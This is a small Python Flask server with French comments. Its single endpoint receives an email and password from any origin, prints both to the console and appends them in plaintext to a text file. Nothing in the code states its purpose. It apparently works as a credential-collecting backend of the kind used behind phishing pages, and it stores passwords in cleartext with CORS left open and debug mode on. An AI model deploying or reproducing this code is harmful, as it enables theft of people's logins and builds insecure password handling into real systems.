from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Permet les requêtes CORS

@app.route('/enregistrer', methods=['POST'])
def enregistrer():
    try:
        # Récupérer les données JSON envoyées
        data = request.get_json()

        if not data or 'email' not in data or 'password' not in data:
            # Si les données sont manquantes ou mal formatées
            return jsonify({"error": "Données invalides, email et password requis"}), 400

        email = data['email']
        password = data['password']

        # Afficher les données reçues dans les logs (optionnel)
        print(f"Données reçues : Email = {email}, Mot de passe = {password}")

        # Enregistrement dans un fichier
        with open("data.txt", "a") as f:
            f.write(f"Email: {email}, Mot de passe: {password}\n")

        # Retourner une réponse JSON avec un message de succès
        return jsonify({"message": "Données enregistrées avec succès"}), 200

    except Exception as e:
        # Si une exception se produit, on renvoie une erreur
        return jsonify({"error": f"Erreur serveur : {str(e)}"}), 500

if __name__ == '__main__':
    app.run(debug=True)  # Démarre le serveur en mode debug
